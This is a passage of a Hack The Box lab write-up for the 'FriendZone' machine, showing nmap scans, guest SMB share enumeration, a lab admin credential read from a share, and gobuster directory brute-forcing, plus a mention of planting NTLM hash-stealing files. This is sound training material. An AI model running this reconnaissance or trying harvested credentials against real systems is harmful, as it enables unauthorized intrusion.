@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — FriendZone&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — FriendZone">
+  
+    <meta name="description" content="Every now and then I’ll go back and do an old box on HTB, it serves as a nice break from all the Windows/AD headscratchers that’s been released recently. It’s also interesting to see how much the boxes have changed over the years. While the current boxes have much more realistic scenarios and often feature newly discovered vulnerabilities, older ones are more CTF-like and full of rabbit holes. Friendzone was released in February 2019, so the box is themed around Valentines with lots of trolls. It starts with finding credentials in an open SMB share and discovering a subdomain via DNS zone transfer. The subdomain hosts an admin portal vulnerable to LFI, which can be exploited to get a shell. Privilege escalation involves a simple Python module hijack.">
+    <meta property="og:description" content="Every now and then I’ll go back and do an old box on HTB, it serves as a nice break from all the Windows/AD headscratchers that’s been released recently. It’s also interesting to see how much the boxes have changed over the years. While the current boxes have much more realistic scenarios and often feature newly discovered vulnerabilities, older ones are more CTF-like and full of rabbit holes. Friendzone was released in February 2019, so the box is themed around Valentines with lots of trolls. It starts with finding credentials in an open SMB share and discovering a subdomain via DNS zone transfer. The subdomain hosts an admin portal vulnerable to LFI, which can be exploited to get a shell. Privilege escalation involves a simple Python module hijack.">
+  
+  
+    <meta property="og:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/85202d08993c628f3b90a7c4299a4019.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/85202d08993c628f3b90a7c4299a4019.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — FriendZone</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Nov 23, 2025</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/2aa0b98a88f7802d8fdcf70f810f97df" class="PageRoot"><h2 id="https://www.notion.so/2aa0b98a88f781f28d39ca33cda8c0e4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2aa0b98a88f781f28d39ca33cda8c0e4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h2><div id="https://www.notion.so/2b40b98a88f780248d51d8bcdc842cbb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Every now and then I’ll go back and do an old box on HTB, it serves as a nice break from all the Windows/AD headscratchers that’s been released recently. It’s also interesting to see how much the boxes have changed over the years. While the current boxes have much more realistic scenarios and often feature newly discovered vulnerabilities, older ones are more CTF-like and full of rabbit holes. Friendzone was released in February 2019, so the box is themed around Valentines with lots of trolls. It starts with finding credentials in an open SMB share and discovering a subdomain via DNS zone transfer. The subdomain hosts an admin portal vulnerable to LFI, which can be exploited to get a shell. Privilege escalation involves a simple Python module hijack.</span></span></p></div><div id="https://www.notion.so/2aa0b98a88f78134a7ddf10f701b6715" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2aa0b98a88f78103958dea43ecbd88c7" class="Divider"></div><h2 id="https://www.notion.so/2aa0b98a88f781c48ef9c1c7559f8420" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2aa0b98a88f781c48ef9c1c7559f8420"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h2><h3 id="https://www.notion.so/2ab0b98a88f780b08bcadb0e0b5009d4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f780b08bcadb0e0b5009d4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Nmap:</span></span></h3><pre id="https://www.notion.so/2ab0b98a88f780eaa68fd2351ccd6275" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.26.47     
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 21:49 ACDT
+Nmap scan report for 10.129.26.47
+Host is up (0.26s latency).
+Not shown: 65528 closed tcp ports (reset)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+53/tcp  open  domain
+80/tcp  open  http
+139/tcp open  netbios-ssn
+443/tcp open  https
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 70.43 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 21,22,53,80,139,443,445 10.129.26.47
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 21:52 ACDT
+Nmap scan report for 10.129.26.47
+Host is up (0.26s latency).
+
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Friend Zone Escape software
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+| tls-alpn: 
+|_  http/1.1
+|_http-title: 404 Not Found
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14
+Network Distance: 2 hops
+Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE\x00
+|   Domain name: \x00
+|   FQDN: friendzone
+|_  System time: 2025-11-13T13:22:39+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb2-time: 
+|   date: 2025-11-13T11:22:39
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -39m58s, deviation: 1h09m16s, median: 0s
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   270.04 ms 10.10.14.1
+2   268.37 ms 10.129.26.47
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.65 seconds</span></span></span></code></pre><div id="https://www.notion.so/2b30b98a88f780e8beb0fda2b4cf0e9e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Nmap found 7 open ports, including ones that are not commonly seen on Linux (RPC, NetBIOS). The SMB script even misidentified the OS as Windows. FTP’s available, but with no anonymous access and a secure version, not much could be done from an unauthenticated standpoint. There’s also HTTP and HTTPS, but they’re running two different sites based on the page titles. The SSL certificate has a domain </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">friendzone.red</code></span><span class="SemanticString">, I’ll add it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><h3 id="https://www.notion.so/2ab0b98a88f78082abeafe8197a00563" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f78082abeafe8197a00563"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">TCP445 — SMB:</span></span></h3><pre id="https://www.notion.so/2ab0b98a88f7805da612f799eb6b4299" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> netexec smb friendzone.red -u &#x27;&#x27; -p &#x27;&#x27; --shares
+
+SMB         10.129.26.47    445    FRIENDZONE       [*] Unix - Samba (name:FRIENDZONE) (domain:) (signing:False) (SMBv1:True) 
+SMB         10.129.26.47    445    FRIENDZONE       [+] \: (Guest)
+SMB         10.129.26.47    445    FRIENDZONE       [*] Enumerated shares
+SMB         10.129.26.47    445    FRIENDZONE       Share           Permissions     Remark
+SMB         10.129.26.47    445    FRIENDZONE       -----           -----------     ------
+SMB         10.129.26.47    445    FRIENDZONE       print$                          Printer Drivers
+SMB         10.129.26.47    445    FRIENDZONE       Files                           FriendZone Samba Server Files /etc/Files
+SMB         10.129.26.47    445    FRIENDZONE       general         READ            FriendZone Samba Server Files
+SMB         10.129.26.47    445    FRIENDZONE       Development     READ,WRITE      FriendZone Samba Server Files
+SMB         10.129.26.47    445    FRIENDZONE       IPC$                            IPC Service (FriendZone server (Samba, Ubuntu))</span></span></span></code></pre><div id="https://www.notion.so/2b30b98a88f7803d80cde86c4fe10c3d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Guest login is enabled, and it has access to two shares, including write permissions on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Development</code></span><span class="SemanticString">. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Files</code></span><span class="SemanticString"> is not accessible, but its remark field exposed the server path of the share. The other shares don’t have this remark, but I can probably make an educated guess that they’re located at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/general</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/Development</code></span><span class="SemanticString"> respectively. This will become important later on.</span></span></p></div><div id="https://www.notion.so/2ab0b98a88f780468a88f0516e632e02" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2ab0b98a88f780159272e93bc2a4875f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">general:</strong></span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780fcac31e197b5459339" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -N \\\\friendzone.red\\general
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> ls
+
+  .                                   D        0  Thu Jan 17 06:40:51 2019
+  ..                                  D        0  Wed Sep 14 00:26:24 2022
+  creds.txt                           N       57  Wed Oct 10 10:22:42 2018
+
+		3545824 blocks of size 1024. 1651352 blocks available</span></span></span></code></pre><div id="https://www.notion.so/2b30b98a88f78023b116dcb4de670663" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It has a single file that contains admin credentials, but it’s unknown what service it’s for.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780e49f16c3d2cfddb921" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> cat creds.txt
+
+creds for the admin THING:
+
+admin:WORKWORKHhallelujah@#</span></span></span></code></pre><div id="https://www.notion.so/2ab0b98a88f780108be3d6019ebe0550" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2ab0b98a88f7809dbb24fe479f64d379" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Development:</strong></span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f78010848ed61424f69ff2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -N \\\\friendzone.red\\Development
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> ls
+
+  .                                   D        0  Thu Nov 13 22:08:08 2025
+  ..                                  D        0  Wed Sep 14 00:26:24 2022
+
+		3545824 blocks of size 1024. 1651348 blocks available</span></span></span></code></pre><div id="https://www.notion.so/2b30b98a88f7802da4a1eabb901a2fa6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Development</code></span><span class="SemanticString"> is empty, but I’m able to upload files to it. If this is a Windows machine, I may upload </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/Greenwolf/ntlm_theft">NTLM hash-stealing files</a></span><span class="SemanticString"> in the hope that someone opens it. Unfortunately this won’t work on Linux.</span></span></p></div><h3 id="https://www.notion.so/2ab0b98a88f78028997ddc93beb3ae69" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f78028997ddc93beb3ae69"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">TCP80 — HTTP:</span></span></h3><div id="https://www.notion.so/2b30b98a88f7809bafc0d3b8ffa5e7ca" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port80_home.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port80_home.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b30b98a88f7804fa003f19d925bfb88" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The home page is already trolling, but aside from the meme there isn’t much else to look at. The email has another domain </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">friendzoneportal.red</code></span><span class="SemanticString">, I’ve added it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString"> but it pointed back to the same page.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780efbb7af6801374f399" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> gobuster dir -u http://friendzone.red -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://friendzone.red
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/wordpress            (Status: 301) [Size: 320] [--&gt; http://friendzone.red/wordpress/]
+Progress: 21054 / 220560 (9.55%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 21090 / 220560 (9.56%)
+===============================================================
+Finished
+===============================================================</span></span></span></code></pre><div id="https://www.notion.so/2b30b98a88f78069a3bdec4fc3807947" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gobuster</code></span><span class="SemanticString"> did find </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/wordpress</code></span><span class="SemanticString">, but it turned out to be just an empty directory listing.</span></span></p></div><div id="https://www.notion.so/2b30b98a88f78003bb4bd565efb0f042" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port80_wordpress.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port80_wordpress.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b30b98a88f7807d8573d6cf8a53edd2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I don’t think there’s anything else on here.</span></span></p></div><h3 id="https://www.notion.so/2ab0b98a88f7801fbbbbe59a2fbff240" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f7801fbbbbe59a2fbff240"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">TCP443 — HTTPS:</span></span></h3><div id="https://www.notion.so/2b30b98a88f780b28b51c0d893853637" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_home.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_home.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b30b98a88f7805bbe85c7f46d09b811" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The HTTPS page is yet another troll.</span></span></p></div><div id="https://www.notion.so/2b30b98a88f780178bc3dfd751da32f8" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_fzportal_home.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_fzportal_home.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b30b98a88f780e0a027e367fd6ab9f1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And so is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">friendzoneportal.red</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/2b30b98a88f780b4beb5eeb5ecc5661f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, the page source of the first site does suggest there’s something at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/js/js</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/2b30b98a88f780a9ab59ef019f7cacbe" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_home_source.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_home_source.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2ab0b98a88f780b0a17ad0d3c473f368" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2ab0b98a88f78039b2dfd1a5446ba97d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">/js/js</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/2b30b98a88f780cd9b69ea87cbe11639" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_js_js.png"><img 